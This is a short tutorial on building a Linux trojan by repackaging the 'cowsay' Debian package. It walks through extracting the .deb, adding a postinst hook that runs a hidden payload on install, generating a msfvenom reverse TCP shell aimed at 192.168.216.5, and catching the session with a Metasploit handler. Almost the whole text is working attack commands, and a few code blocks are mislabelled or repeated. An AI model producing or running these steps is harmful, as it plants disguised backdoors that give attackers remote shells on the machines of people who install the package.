## Steps to create linux trojan
1. First, we need to download the package we want to place our payload in; for this recipe we will use cowsay.
a simple program that generates an ASCII picture of a cow saying something provided by the user:
```python
root@kali:~# apt --download-only install cowsay
```

2. Now that we have downloaded the package, we will extract the package to a new directory called cowsay:
```python
root@kali:~# dpkg -x /var/cache/apt/archives/cowsay_3.03+dfsg2-4_all.deb cowsay
```

3. Debian packages must adhere to a strict directory structure, so we need to create a subdirectory under the program's source directory, called DEBIAN:
```python
root@kali:~/trojan# mkdir cowsay/DEBIAN 
root@kali:~/trojan# cd cowsay/DEBIAN/
```

4. Next, we need to create the control file, which is the core of the Debian package, containing all relevant metadata such as package name, version, supported architectures, and dependencies:
```python
root@kali:~/cowsay/DEBIAN# cat control
```

**Output**k - 
```python
Package: cowsay 
Version: 3.03+dfsg2-4 
Architecture: all 
Maintainer: Francois Marier 
Installed-Size: 90 
Depends: perl 
Suggests: filters 
Section: games 
Priority: optional 
Homepage: http://www.nog.net/~tony/warez 
Description: configurable talking cow Cowsay (or cowthink) will turn text into happy ASCII cows, with speech (or thought) balloons. If you don't like cows, ASCII art is available to replace it with some other creatures (Tux, the BSD daemon, dragons, and a plethora of animals, from a turkey to an elephant in a snake).
```

5. Then we will create a post-installation file called postinst that will add the proper permissions to our payload, which will be called cowsay_trojan, and execute it:
```python
cat postinst chmod 2755 /usr/games/cowsay_trojan && /usr/games/cowsay_trojan & /usr/games/cowsay Welcome
```

6. Now that we have all the required files, we will generate the payload using msfvenom:
```python
msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.216.5 -b "\x00" -f elf -o /root/cowsay/usr/games/cowsay_trojan
```

7. Before we can build our new package, we need to make the postinst file executable using the chmod command. To build the package, we use the dpkgdeb command with the --build option, followed by the path to the program's source directory:
```python
root@kali:~/cowsay/DEBIAN# chmod 755 postinst 
root@kali:~/cowsay/DEBIAN# dpkg-deb --build /root/cowsay/
```

8. To test our trojan, we will start a listener in a new terminal window using msfconsole with the -x option, which allows us to specify a string as console commands:
```python
root@kali:~# msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST 192.168.216.5; run'
```
- Using the -x option with msfconsole can save you some time and allows you to launch msfconsole from scripts.

9. Since Kali is itself is a Linux client machine, we can test the trojan simply by changing to our home directory and using the dpkg command to install the cowsay program:
```python
root@kali:~/cowsay/DEBIAN# cd 
root@kali:~# dpkg -i cowsay.deb
```

10. Sure enough, in the terminal where we are running our listener, we should see a new session which was spawned by our Linux trojan:
```python
root@kali:~# msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST 192.168.216.5; run'
```

